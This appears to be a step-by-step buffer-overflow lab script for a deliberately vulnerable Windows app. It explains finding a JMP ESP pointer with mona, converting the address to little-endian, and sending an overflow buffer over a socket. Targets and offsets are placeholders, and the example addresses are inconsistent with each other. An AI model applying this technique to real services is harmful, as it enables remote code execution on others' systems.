#!/usr/bin/python

"""
Now that we idenfited our bad characters we can proceed to find our
jmp esp point in immunity debugger. To do so, run the following:
    
!mona jmp -r esp -cpb '\x00\x51'

        or sometimes
        if it fails you can run this
!mona jmp -r esp -cpb \x00
        and it will identify your  program        

Immunity will find the pointer and say either 1 pointer or 2, in this example
it's just one. Output:
    EXAMPLE:
Log data, item 3 Address=148010CF  Message=  0x148010cf : jmp esp |  {PAGE_EXECUTE_READ} [VulnApp1.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: True,
 v-1.0- (C:\Tools\windows_buffer_overflows\VulnApp1.exe)

Once the immunity identifies the jmp point, right click on the line and select
"Follow in Dissambler" This will take us back to the main page of immunity.

On the top left pane you'll see the address is highlighted, the portion we are going to use is in the left column starting with the following number:
    "1234556"
    
This number will now become our EIP Register that we are going to use for the rest of our exploit dev. But we can't just write 
that address "148010CF" as is, with memory addressing in computer it's always "little endian big endian". The address is written
backwards basically. This is how i break this up: 
    12345566 = \x12\x34\x55\x66
    little endian conversion :
        "\x66\x55\x34\x12"
1234556   FFE4             JMP ESP

To test that we are hitting our new EIP in immunity set a break point on "1234556"
with F2 and restart the program and verify that it stops there. If so proceed

add your jmp esp result
    result = 


@author: bryan
"""
import socket

RHOST = "<IP>"  #Target IP
RPORT = <PORT> 	   #Target Port


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf = "A" * <offset> + <jmp esp>



s.send("OVERFLOW1 " + buf)
s.recv(1024)
s.close()
